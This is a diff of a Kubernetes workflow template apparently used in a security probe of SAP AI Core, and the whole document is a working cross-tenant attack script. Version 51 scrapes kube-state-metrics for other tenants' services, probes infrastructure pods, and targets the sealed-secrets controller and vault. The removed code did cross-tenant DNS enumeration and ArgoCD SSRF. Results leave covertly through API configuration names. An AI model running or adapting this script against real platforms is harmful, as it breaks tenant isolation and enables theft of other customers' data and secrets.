@@ -10,7 +10,7 @@ metadata:
   labels:
     scenarios.ai.sap.com/id: "bb14-scenario"
     executables.ai.sap.com/id: "bb14-probe"
-    ai.sap.com/version: "50.0.0"
+    ai.sap.com/version: "51.0.0"
 spec:
   entrypoint: main
   templates:
@@ -24,7 +24,7 @@ spec:
       - bash
       - -c
       - |
-        # V50: Cross-tenant network access test + ArgoCD SSRF to tenant services
+        # V51: Extract services from mt-* namespaces + test connectivity to infra pods
         AUTH_URL="https://cf-aicore-security-bb-14.authentication.eu10.hana.ondemand.com"
         API="https://api.ai.sec-eu10.eu-central-1.aws.ml.hana.ondemand.com"
         CID="sb-aicore-bb-14!b627554|aicore-xsuaa-std!b563784"
@@ -35,78 +35,81 @@ spec:
           | python3 -c "import json,sys; print(json.load(sys.stdin).get('access_token','FAIL'))" 2>/dev/null)
 
         save() {
-          local name="v50-$(echo "$1" | tr -c 'a-zA-Z0-9._-' '-' | head -c 220)"
+          local name="v51-$(echo "$1" | tr -c 'a-zA-Z0-9._-' '-' | head -c 220)"
           curl -sk -X POST "${API}/v2/lm/configurations" \
             -H "Authorization: Bearer $JWT" -H "AI-Resource-Group: default" \
             -H "Content-Type: application/json" \
             -d "{\"name\":\"${name}\",\"executableId\":\"bb14-probe\",\"scenarioId\":\"bb14-scenario\"}" 2>/dev/null > /dev/null
         }
 
-        # Pick 5 other tenant RG namespaces to probe
-        TARGETS="rg-765c091a-cd927cab rg-a70b5e11-cd927cab rg-4b258265-cd927cab rg-00909d9a-cd927cab rg-ee1f1ccd-cd927cab"
+        KSM_MULTI="100.110.128.70"
 
-        # 1. DNS enumeration of services in other tenant namespaces
-        echo "=== CROSS-TENANT DNS ===" >&2
-        for rg in $TARGETS; do
-          # Common SAP AI Core service names
-          FOUND=""
-          for svc in api-server inference-server serving model-server deployment-server argo-server default; do
-            ip=$(dig +short "${svc}.${rg}.svc.cluster.local" 2>/dev/null | head -1)
-            if [ -n "$ip" ]; then
-              FOUND="${FOUND}${svc}=${ip}."
-            fi
-          done
-          # Also try SRV wildcard
-          SRV=$(dig +short SRV "*.${rg}.svc.cluster.local" 2>/dev/null | head -3 | tr '\n' '|')
-          save "dns-${rg}-${FOUND:-none}-srv-${SRV:-empty}"
+        # 1. Extract services per namespace from KSM-multi
+        echo "=== SERVICES PER NS ===" >&2
+        MULTI=$(curl -sk --connect-timeout 20 "http://${KSM_MULTI}:8080/metrics" 2>&1)
+
+        # Services in mt-* namespaces
+        MT_SVCS=$(echo "$MULTI" | grep 'kube_service_info' | grep 'namespace="mt-' | grep -o 'service="[^"]*".*namespace="[^"]*"' | sort -u | head -20 | tr '\n' '|')
+        save "mt-svcs-${MT_SVCS}"
+
+        # Services with their cluster IPs
+        SVC_IPS=$(echo "$MULTI" | grep 'kube_service_info' | grep 'namespace="mt-\|namespace="ai-launchpad\|namespace="aicore"' | grep -o 'cluster_ip="[^"]*".*service="[^"]*"' | sort -u | head -15 | tr '\n' '|')
+        save "svc-ips-${SVC_IPS}"
+
+        # Service types (ClusterIP, NodePort, LoadBalancer)
+        SVC_TYPES=$(echo "$MULTI" | grep 'kube_service_spec_type' | grep -v 'ClusterIP' | head -10 | tr '\n' '|')
+        save "svc-types-${SVC_TYPES}"
+
+        # 2. Direct pod connectivity to infrastructure services (from V49 IPs)
+        echo "=== POD CONNECTIVITY ===" >&2
+        # Try AI Launchpad pods directly by IP
+        for ip in 100.64.0.25 100.64.0.26 100.64.0.27 100.64.0.35 100.64.0.39; do
+          R=$(curl -sk --connect-timeout 2 "http://${ip}:8080/" 2>&1 | head -c 100)
+          if [ -n "$R" ] && ! echo "$R" | grep -q "refused\|timed out\|reset"; then
+            save "pod-${ip}-8080-$(echo $R | head -c 80)"
+          else
+            save "pod-${ip}-8080-blocked"
+          fi
         done
 
-        # 2. Direct TCP connectivity test to other tenant pods (if IPs found)
-        echo "=== CROSS-TENANT TCP ===" >&2
-        for rg in $TARGETS; do
-          # Try connecting to the default service endpoint
-          R=$(curl -sk --connect-timeout 3 "http://default.${rg}.svc.cluster.local/" 2>&1 | head -c 150)
-          save "tcp-${rg}-default-$(echo $R | head -c 100)"
+        # 3. Try sealed-secrets controller (HIGH VALUE - could decrypt secrets)
+        echo "=== SEALED SECRETS ===" >&2
+        SS_IP=$(dig +short "sealed-secrets-controller.sealed-secrets.svc.cluster.local" 2>/dev/null | head -1)
+        save "ss-ip-${SS_IP:-NXDOMAIN}"
+        if [ -n "$SS_IP" ]; then
+          R=$(curl -sk --connect-timeout 3 "http://${SS_IP}:8080/healthz" 2>&1 | head -c 100)
+          save "ss-health-${R}"
+          R2=$(curl -sk --connect-timeout 3 "http://${SS_IP}:8080/v1/cert.pem" 2>&1 | head -c 150)
+          save "ss-cert-${R2}"
+        fi
 
-          # Try port 8080 (common serving port)
-          R=$(curl -sk --connect-timeout 3 "http://${rg}.svc.cluster.local:8080/" 2>&1 | head -c 100)
-          save "tcp-${rg}-8080-$(echo $R | head -c 80)"
+        # 4. Cluster-secrets namespace probing
+        echo "=== CLUSTER SECRETS ===" >&2
+        for svc in vault vault-agent vault-internal; do
+          ip=$(dig +short "${svc}.cluster-secrets.svc.cluster.local" 2>/dev/null | head -1)
+          [ -n "$ip" ] && save "csec-${svc}-${ip}"
         done
 
-        # 3. ArgoCD SSRF to specific tenant service
-        echo "=== ARGOCD TENANT SSRF ===" >&2
-        # Register repo pointing to another tenant's namespace
-        for rg in rg-765c091a-cd927cab rg-a70b5e11-cd927cab; do
-          REPO_NAME="xt-${rg}"
-          REPO_URL="http://default.${rg}.svc.cluster.local/test"
+        # 5. Try reachable infrastructure services from pod
+        echo "=== INFRA REACH ===" >&2
+        # AI Launchpad core-admin (V49 confirmed this service exists)
+        R=$(curl -sk --connect-timeout 3 "http://ai-launchpad-core-admin-svc.ai-launchpad.svc.cluster.local/" 2>&1 | head -c 150)
+        save "lp-admin-$(echo $R | head -c 100)"
 
-          RR=$(curl -sk -X POST "${API}/v2/admin/repositories" \
-            -H "Authorization: Bearer $JWT" \
-            -H "AI-Resource-Group: default" \
-            -H "Content-Type: application/json" \
-            -d "{\"name\":\"${REPO_NAME}\",\"url\":\"${REPO_URL}\",\"username\":\"x\",\"password\":\"x\"}" 2>/dev/null)
-          save "argocd-repo-${rg}-$(echo $RR | head -c 80)"
+        # AI Launchpad LLM service
+        R=$(curl -sk --connect-timeout 3 "http://ai-launchpad-llm-svc.ai-launchpad.svc.cluster.local/" 2>&1 | head -c 150)
+        save "lp-llm-$(echo $R | head -c 100)"
 
-          # Create app
-          AR=$(curl -sk -X POST "${API}/v2/admin/applications" \
-            -H "Authorization: Bearer $JWT" \
-            -H "AI-Resource-Group: default" \
-            -H "Content-Type: application/json" \
-            -d "{\"applicationName\":\"xt-${rg}-app\",\"repositoryUrl\":\"${REPO_URL}\",\"revision\":\"HEAD\",\"path\":\".\"}" 2>/dev/null)
-          save "argocd-app-${rg}-$(echo $AR | head -c 80)"
-        done
+        # Context registry
+        R=$(curl -sk --connect-timeout 3 "http://context-registry.context-registry.svc.cluster.local/" 2>&1 | head -c 150)
+        save "ctx-reg-$(echo $R | head -c 100)"
 
-        # 4. Check our own namespace DNS to understand the naming pattern
-        echo "=== OUR NS ===" >&2
-        OUR_RG="rg-3ba0e0a4-cd927cab"
-        OWN_SVCS=""
-        for svc in $(dig +short SRV "*.${OUR_RG}.svc.cluster.local" 2>/dev/null | awk '{print $4}' | head -5); do
-          OWN_SVCS="${OWN_SVCS}${svc}."
-        done
-        save "own-svcs-${OWN_SVCS:-none}"
+        # User management
+        R=$(curl -sk --connect-timeout 3 "http://user-management.user-management.svc.cluster.local/" 2>&1 | head -c 150)
+        save "user-mgmt-$(echo $R | head -c 100)"
 
-        # Check what IPs are in our namespace
-        OWN_PODS=$(dig +short A "*.${OUR_RG}.svc.cluster.local" 2>/dev/null | head -3 | tr '\n' '|')
-        save "own-pods-${OWN_PODS:-none}"
+        # Metering
+        R=$(curl -sk --connect-timeout 3 "http://metering.metering.svc.cluster.local/" 2>&1 | head -c 150)
+        save "metering-$(echo $R | head -c 100)"
 
-        echo "V50 DONE" >&2
+        echo "V51 DONE" >&2
